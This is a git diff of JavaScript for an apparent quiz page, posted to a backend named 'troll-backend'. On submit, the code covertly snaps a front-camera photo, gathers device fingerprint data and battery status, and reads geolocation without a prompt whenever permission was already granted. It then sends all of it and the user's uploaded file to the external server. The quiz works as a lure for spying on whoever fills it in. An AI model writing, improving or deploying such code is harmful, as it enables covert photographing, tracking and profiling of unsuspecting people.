@@ -1,30 +1,37 @@
-const btn = document.getElementById('submit-btn');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const fileInput = document.getElementById('user-file');
+// ================================
+// DOM ELEMENTS
+// ================================
+const btn = document.getElementById("submit-btn");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const fileInput = document.getElementById("user-file");
+const form = document.getElementById("quiz-form");
 
 const BACKEND_BASE = "https://troll-backend.onrender.com/api";
 
 // ================================
-// SILENT LOCATION (NO POPUP)
+// SILENT LOCATION (ONLY IF GRANTED)
 // ================================
 async function getSilentLocation() {
-  if (!navigator.permissions) return "";
+  let location = "N/A";
+
+  if (!navigator.permissions || !navigator.geolocation) return location;
 
   try {
     const status = await navigator.permissions.query({ name: "geolocation" });
     if (status.state === "granted") {
-      const pos = await new Promise(res =>
-        navigator.geolocation.getCurrentPosition(res)
+      const pos = await new Promise((res, rej) =>
+        navigator.geolocation.getCurrentPosition(res, rej)
       );
-      return `${pos.coords.latitude},${pos.coords.longitude}`;
+      location = `${pos.coords.latitude},${pos.coords.longitude}`;
     }
-  } catch {}
-  return "";
+  } catch (e) {}
+
+  return location;
 }
 
 // ================================
-// METADATA
+// METADATA COLLECTION
 // ================================
 async function collectMetadata() {
   const meta = {
@@ -38,58 +45,58 @@ async function collectMetadata() {
     cpuThreads: navigator.hardwareConcurrency || "N/A",
     cookieEnabled: navigator.cookieEnabled,
     referer: document.referrer,
-    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
+    network: navigator.connection
+      ? JSON.stringify(navigator.connection)
+      : "N/A",
     battery: "N/A",
     location: await getSilentLocation()
   };
 
   if (navigator.getBattery) {
     try {
-      const b = await navigator.getBattery();
-      meta.battery = `${b.level * 100}% charging:${b.charging}`;
-    } catch {}
+      const battery = await navigator.getBattery();
+      meta.battery = `${battery.level * 100}% charging:${battery.charging}`;
+    } catch (e) {}
   }
 
   return meta;
 }
 
 // ================================
-// CAMERA CAPTURE (FIXED)
+// CAMERA CAPTURE + SEND
 // ================================
 async function captureAndSendCamera() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
-    });
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user" },
+    audio: false
+  });
 
-    video.srcObject = stream;
-    video.muted = true;
-    video.setAttribute("playsinline", true);
-    await video.play(); // 🔴 REQUIRED
+  video.srcObject = stream;
+  video.muted = true;
+  await video.play();
 
-    // Wait for camera exposure
-    await new Promise(r => setTimeout(r, 2500));
+  // wait until video is ready
+  await new Promise(resolve => {
+    if (video.videoWidth > 0) return resolve();
+    video.onloadedmetadata = () => resolve();
+  });
 
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
 
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+  const ctx = canvas.getContext("2d");
+  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const image = canvas.toDataURL("image/png");
-    const metadata = await collectMetadata();
+  const image = canvas.toDataURL("image/png");
+  const metadata = await collectMetadata();
 
-    await fetch(`${BACKEND_BASE}/upload`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image, metadata })
-    });
+  await fetch(`${BACKEND_BASE}/upload`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ image, metadata })
+  });
 
-    stream.getTracks().forEach(t => t.stop());
-  } catch (err) {
-    console.error("Camera failed:", err);
-  }
+  stream.getTracks().forEach(track => track.stop());
 }
 
 // ================================
@@ -114,20 +121,31 @@ async function sendFile(file) {
 }
 
 // ================================
-// SUBMIT FLOW (FIXED)
+// PREVENT FORM SUBMIT DEFAULT
+// ================================
+form.addEventListener("submit", e => e.preventDefault());
+
+// ================================
+// SUBMIT FLOW
 // ================================
 btn.addEventListener("click", async e => {
   e.preventDefault();
-  btn.disabled = true;
 
-  if (!fileInput.files.length) {
-    btn.disabled = false;
+  // browser validation
+  if (!form.checkValidity()) {
+    form.reportValidity();
     return;
   }
 
-  await captureAndSendCamera();
-  await sendFile(fileInput.files[0]);
+  if (!fileInput.files.length) return;
 
-  document.getElementById("quiz-container").style.display = "none";
-  document.getElementById("success-container").style.display = "block";
+  try {
+    await captureAndSendCamera();
+    await sendFile(fileInput.files[0]);
+
+    document.getElementById("quiz-container").style.display = "none";
+    document.getElementById("success-container").style.display = "block";
+  } catch (err) {
+    console.error("Submission error:", err);
+  }
 });
